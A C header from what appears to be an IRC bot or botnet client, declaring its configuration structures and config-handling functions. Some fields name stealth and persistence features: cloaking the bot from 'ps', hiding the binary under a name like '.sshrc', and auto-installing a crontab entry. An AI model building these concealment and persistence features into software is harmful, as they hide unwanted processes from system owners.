#ifndef _CONF_H
#define _CONF_H

#include <sys/types.h>
#include <stdio.h>

typedef struct conf_bot_b {
  char *nick;
  char *host;
  char *host6;
  char *ip;
  char *ip6;
  pid_t pid;              /* contains the PID for the bot (read for the pidfile) */
  char *pid_file;       /* path and filename of the .pid file */
#ifdef LEAF
  int localhub;         /* bot is localhub */
#endif /* LEAF */
  struct userrec *u;	/* our own user record */
  struct conf_bot_b *next;
} conf_bot;

typedef struct conf_b {
  char *md5;		/* md5 hash of the binary */
  uid_t uid;
  char *uname;
  char *username;       /* shell username */
  char *homedir;        /* homedir */
  int autouname;        /* should we just auto update any changed in uname output? */
  int pscloak;          /* should the bots bother trying to cloak `ps`? */
  int portmin;          /* for hubs, the reserved port range for incoming connections */
  int portmax;          /* for hubs, the reserved port range for incoming connections */
  char *binpath;        /* path to binary, ie: ~/ */
  char *binname;        /* binary name, ie: .sshrc */
  int autocron;         /* should the bot auto crontab itself? */
  char *comments;       /* we dont want to lose our comments now do we?! */
  conf_bot *bots;       /* the list of bots */
  conf_bot *bot;        /* single bot (me) */
} conf_t;

extern conf_t		conf, conffile;

enum {
  CONF_ENC = 1,
  CONF_COMMENT = 2
};


#ifdef LEAF
void spawnbots();
int killbot(char *);
#endif /* LEAF */
#ifdef S_CONFEDIT
void confedit(char *);
#endif /* S_CONFEDIT */
pid_t checkpid(char *, conf_bot *);
void showconf();
void init_conf();
void free_conf();
int readconf(char *);
int parseconf();
int writeconf(char *, FILE *, int);
void fillconf(conf_t *);

#endif /* !_CONF_H */
